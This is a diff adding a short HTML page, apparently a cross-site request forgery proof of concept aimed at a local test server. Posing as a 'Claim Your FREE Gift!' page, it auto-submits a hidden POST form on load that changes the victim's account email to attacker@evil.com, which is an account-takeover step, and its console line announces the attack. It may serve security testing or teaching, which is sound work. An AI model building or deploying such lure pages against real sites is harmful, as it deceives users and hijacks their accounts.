@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Gift!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            text-align: center;
+            padding: 80px 20px;
+            min-height: 100vh;
+            margin: 0;
+        }
+        h1 { font-size: 48px; margin: 0 0 20px; }
+        p { font-size: 20px; opacity: 0.9; }
+        .gift { font-size: 120px; margin: 30px 0; }
+    </style>
+</head>
+<body>
+    <div class="gift">🎁</div>
+    <h1>Claim Your FREE Gift!</h1>
+    <p>Processing your claim...</p>
+    <form id="csrf" action="http://localhost:3001/api/change-email" method="POST">
+        <input type="hidden" name="email" value="attacker@evil.com" />
+    </form>
+    <script>
+        console.log('[CSRF] Firing attack...');
+        document.getElementById('csrf').submit();
+    </script>
+</body>
+</html>
